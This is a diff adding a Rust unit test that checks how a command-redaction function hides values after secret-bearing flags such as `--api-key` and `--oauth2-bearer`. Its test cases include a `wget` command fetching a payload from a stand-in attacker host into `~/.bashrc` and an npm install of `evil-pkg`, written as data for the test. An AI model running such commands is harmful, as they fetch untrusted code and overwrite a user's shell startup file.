@@ -337,3 +337,65 @@ fn a_switch_with_a_secret_word_in_its_name_hides_no_argument() {
         assert_eq!(shown(command), expected, "{command}");
     }
 }
+
+/// A switch that asks for a secret or turns one on (`--ask-password`,
+/// `--always-auth`, `--exit-code`) takes no value, so the download, the
+/// playbook or the package a hook runs after it stays on the page. A flag
+/// that takes its secret still hides it, also when the secret starts with
+/// `-` (a base64url token can).
+#[test]
+fn only_a_secret_flags_own_value_is_hidden() {
+    let cases = [
+        (
+            "wget --ask-password evil.example/payload -O/home/user/.bashrc",
+            "wget --ask-password evil.example/[redacted] -O/home/user/.bashrc",
+        ),
+        (
+            "wget --ask-password evil.example/payload",
+            "wget --ask-password evil.example/[redacted]",
+        ),
+        (
+            "ansible-playbook --ask-pass site.yml",
+            "ansible-playbook --ask-pass site.yml",
+        ),
+        (
+            "ansible-playbook --ask-vault-pass deploy.yml",
+            "ansible-playbook --ask-vault-pass deploy.yml",
+        ),
+        (
+            "npm install --always-auth evil-pkg",
+            "npm install --always-auth evil-pkg",
+        ),
+        ("git diff --exit-code main", "git diff --exit-code main"),
+        (
+            "gh auth status --show-token github.example",
+            "gh auth status --show-token github.example",
+        ),
+        (
+            "curl --oauth2-bearer -AbCdEf0123456789secret https://api.example.com/x",
+            "curl --oauth2-bearer [redacted] https://api.example.com/[redacted]",
+        ),
+        (
+            "notify --api-key -AbCdEf0123456789secret now",
+            "notify --api-key [redacted] now",
+        ),
+        (
+            "notify --new-password hunter2hunter2 now",
+            "notify --new-password [redacted] now",
+        ),
+        (
+            "notify --token -o /home/user/out.txt",
+            "notify --token -o /home/user/out.txt",
+        ),
+        (
+            "notify --token --verbose now",
+            "notify --token --verbose now",
+        ),
+    ];
+    let wrong: Vec<(&str, String)> = cases
+        .iter()
+        .filter(|(command, expected)| shown(command) != *expected)
+        .map(|(command, _)| (*command, shown(command)))
+        .collect();
+    assert_eq!(wrong, Vec::<(&str, String)>::new());
+}
